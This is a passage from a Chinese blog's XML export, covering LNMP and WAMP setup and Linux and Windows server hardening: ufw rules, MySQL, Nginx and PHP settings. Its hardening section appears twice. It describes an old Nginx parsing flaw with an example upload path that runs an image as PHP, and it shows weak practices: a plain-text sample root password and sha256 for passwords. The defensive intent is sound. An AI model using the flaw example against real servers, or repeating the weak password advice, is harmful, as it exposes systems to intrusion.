ufw delete allow 3306/tcp # 设置本机80端口访问的白名单：只允许192.168.0.0网段的ip访问本机80端口sudo ufw allow 80/tcp from 192.168.0.0/24# 允许此ip访问本机的所有端口（定向访问）sudo ufw allow from 192.168.0.7# 禁止这个ip访问本机（黑名单）sudo ufw delete allow from 192.168.0.2 mysql4.2.1.思考1.如果是root账号开放远程登录，那么权限太过高了，项目里也是对指定数据库开放对应的用户权限2.端口号默认是3306，很多扫描器都会盯着，那么修改下默认端口会缓解不少~3.开启binlog可以预防黑客修改数据后没法恢复的尴尬4.设置innodb一个表对应一个文件可以对黑客串改的数据进行针对性恢复PS：被修改的表应急情况下可以使用10分钟前的备份文件来保证安全性，如果不设置，那么所有表数据都是在一个文件里的（容易丢失太多数据 ） 在配置文件sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf中修改port 重启mysql Nginx通过常见的攻击手段来防护： 禁止目录浏览编辑配置文件 隐藏版本信息编辑配置文件、添加http模块中如下一行内容 限制HTTP请求方法 密码爆破后台密码爆破还是挺常见的程序里面主要就是通过验证码和ip访问频率来限制PS：后台密码设置更复杂些，加密方式选sha256来增加密码解猜的难度Nginx里面可以通过：access_module来设置ip限制的PS：某些页面只能特定ip访问，提高渗透难度还可以设置预警机制，太过频繁会提示管理人员处理 特定ip才能访问后台 : 文件上传漏洞Nginx早期版本有解析漏洞，eg：www.baidu.com/upload/1.jpg/1.php ==&gt; 1.jpg作为php代码进行执行解决：\1. 升级Nginx版本\2. 制定目录下的格式限制（可以是白名单也可以黑名单）eg：不允许upload文件夹下访问php格式的文件 PHP 防止变量覆盖：register_globals=off 防止越权访问目录：open_basedir = /var/www/html（制定目录） 防止远程文件包含：allow_url_include=off and allow_url_fopen=offlua_package_path “/etc/nginx/waf/?.lua”;lua_shared_dict limit 10m;init_by_lua_file /etc/nginx/waf/init.lua;access_by_lua_file /etc/nginx/waf/waf.lua;4. 防止显示详细的错误信息：display_errors=off 记录错误在日志文件中：log_errors=on 关闭不安全的字符串转义处理函数（防SQLi和XSS）：magic_quotes_gpc=off 如果PHP以CGI方式安装则需要关闭：cgi.fix_pathinfo=0 防御XSS（开启HttpOnly）session.cookie_httponly=1 HTTPS下提高安全性：session.cookie_secure=1 不加固的后果:获得目标服务器的权限，造成信息泄露，成为肉鸡 先整理这些，后续遇到再不断完善]]></content>
  </entry>
  <entry>
    <title><![CDATA[LNMP环境搭建]]></title>
    <url>%2F2019%2F08%2F31%2F%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[环境搭建-LNMPUbuntu 镜像下载：https://mirrors.huaweicloud.com/ubuntu-releases/bionic/ 系统安装安装语言选择最小安装格式化硬盘 配置root密码默认root密码是随机的，即每次开机都有一个新的root密码。我们可以在终端输入命令 sudo passwd，然后输入当前用户的密码，终端会提示我们输入新的密码并确认，此时的密码就是root新密码。修改成功后，输入命令 su root，再输入新的密码就ok了 配置镜像源1.编辑源：sudo gedit /etc/apt/sources.list 2.复制以下清华提供的镜像源：https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 3.更新系统：sudo apt update &amp;&amp; sudo apt upgrade &amp;&amp; sudo apt dist-upgrade SSH and htop安装SSH：sudo apt install openssh-server htop：sudo apt install htop 谷歌浏览器谷歌浏览器deb文件下载： https://www.google.cn/chrome/ 安装谷歌浏览器：sudo dpkg -i google-chrome*.deb ，修复依赖 卸载火狐浏览器：sudo apt autoremove firefox* 搜狗输入法官方地址：https://pinyin.sogou.com/linux/ 安装sogo: dpkg -i sogopinyin*.deb 修复依赖：sudo apt install -f 设置系统默认输入法： 删除自带输入法： Ctrl+space 切换输入法 安装mysql安装MySQL：sudo apt install mysql-server msysql 安全初始化 安全初始化：sudo mysql_secure_installation 登录测试 安装NginxNginx： sudo apt install nginx 验证： 安装PHP-FPM安装PHP 配置Nginx:sudo gpedit /etc/nginx/sites-available/default 添加默认页面：index.php 取消默认注释: 配置php-fpm文件：sudo gedit /etc/php/7.2/fpm/php-fpm.conf listen = /var/run/php/php7.0-fpm.sock (监听sock,路径和Nginx的一样) 重启Nginx和php-fpm配置生效sudo systemctl restart php7.2-fpm sudo systemctl restart nginx 验证： CURD(PHP)安装驱动 安装PHP的mysql驱动： sudo apt intstall php7.2-mysql 连接mysql 验证 环境搭建-WAMPwindows系统环境 安装ApacheApache 下载位置http://archive.apache.org/dist/httpd/binaries/win32/ 安装文件位置默认 安装完成 测试 安装mysql下载链接 https://www.zyboe.com/pan/273367p694614 一直下一步，选择默认路径安装 完成安装 配置 Development Machine：开发机器，MySQL会占用最少量的内存。 Server Machine：服务器机器，几个服务器应用会运行在机器上，适用于作为网站或应用的数据库服务器，会占用中等内存。 Dedicated Machine：专用机器，机器专门用来运行MySQL数据库服务器，会占用机器的所有可用内存。 根据自己的用途选择相应的类型配置，我这里为了后面做高并发性能测试便选择“Server Machine”类型。 常用的是TCP/IP连接，勾选该选项框，默认端口号是3306，可在输入框中更改 选择编码 添加到CMD 环境变量 设置root密码 Mysql@123 完成安装 安装PHP将文件夹复制到与apache安装路径同 编辑文件 PHP与apache的整合： 将改文件修改为php.ini: 编辑apache的配置文件： 添加首页文件 PHP与mysql整合 在php配置文件中修改拓展类型的路径： 开启mysql扩展类型 测试 创建www文件夹，并修改目录路径 数据库连接 服务器加固windows1.及时更新系统补丁 2.设置密码强度 3.屏幕保护（锁屏时间） 4.禁止远程连接 5.增强日志审核 等等。。。。 LINUX1.删除用不到的那些普通用户 2.SSH相关加固思路： SSH修改端口：不让端口扫描器轻易发现 不允许Root远程登录：root权限太大，只允许一般账户远程登录 3.防火墙加固思路：主要就是限制端口的对外访问，暴露越少相对越安全 查看用户 ，对于一些保留的系统伪账户：bin、sys、adm、uucp、lp、nuucp、hpdb、www、daemon等可根据需要锁定登陆 锁定不必要：passwd -l &lt;用户名&gt;解锁账号：passwd -u &lt;用户名&gt; ssh的配置 SSH的配置：/etc/ssh/sshd_config 重启下ssh：sudo systemctl restart ssh 验证：下次登录的时候使用的端口就是修改后的了 防火墙： #开启/关闭/查看防火墙状态sudo ufw enable|disable|status# 开通3306端口sudo ufw allow 3306/tcp# 禁用本机的3306端口sudo ufw delete allow 3306/tcp # 设置本机80端口访问的白名单：只允许192.168.0.0网段的ip访问本机80端口sudo ufw allow 80/tcp from 192.168.0.0/24# 允许此ip访问本机的所有端口（定向访问）sudo ufw allow from 192.168.0.7# 禁止这个ip访问本机（黑名单）sudo ufw delete allow from 192.168.0.2 mysql4.2.1.思考1.如果是root账号开放远程登录，那么权限太过高了，项目里也是对指定数据库开放对应的用户权限2.端口号默认是3306，很多扫描器都会盯着，那么修改下默认端口会缓解不少~3.开启binlog可以预防黑客修改数据后没法恢复的尴尬4.设置innodb一个表对应一个文件可以对黑客串改的数据进行针对性恢复PS：被修改的表应急情况下可以使用10分钟前的备份文件来保证安全性，如果不设置，那么所有表数据都是在一个文件里的（容易丢失太多数据 ） 在配置文件sudo vi /etc/mysql/mysql.conf.d/mysqld.cnf中修改port 重启mysql Nginx通过常见的攻击手段来防护： 禁止目录浏览编辑配置文件 隐藏版本信息编辑配置文件、添加http模块中如下一行内容 限制HTTP请求方法 密码爆破后台密码爆破还是挺常见的程序里面主要就是通过验证码和ip访问频率来限制PS：后台密码设置更复杂些，加密方式选sha256来增加密码解猜的难度Nginx里面可以通过：access_module来设置ip限制的PS：某些页面只能特定ip访问，提高渗透难度还可以设置预警机制，太过频繁会提示管理人员处理 特定ip才能访问后台 : 文件上传漏洞Nginx早期版本有解析漏洞，eg：www.baidu.com/upload/1.jpg/1.php ==&gt; 1.jpg作为php代码进行执行解决：\1. 升级Nginx版本\2. 制定目录下的格式限制（可以是白名单也可以黑名单）eg：不允许upload文件夹下访问php格式的文件 PHP 防止变量覆盖：register_globals=off 防止越权访问目录：open_basedir = /var/www/html（制定目录） 防止远程文件包含：allow_url_include=off and allow_url_fopen=offlua_package_path “/etc/nginx/waf/?.lua”;lua_shared_dict limit 10m;init_by_lua_file /etc/nginx/waf/init.lua;access_by_lua_file /etc/nginx/waf/waf.lua;4. 防止显示详细的错误信息：display_errors=off 记录错误在日志文件中：log_errors=on 关闭不安全的字符串转义处理函数（防SQLi和XSS）：magic_quotes_gpc=off 如果PHP以CGI方式安装则需要关闭：cgi.fix_pathinfo=0 防御XSS（开启HttpOnly）session.cookie_httponly=1 HTTPS下提高安全性：session.cookie_secure=1 不加固的后果:获得目标服务器的权限，造成信息泄露，成为肉鸡 先整理这些，后续遇到再不断完善]]></content>
  </entry>
</search>
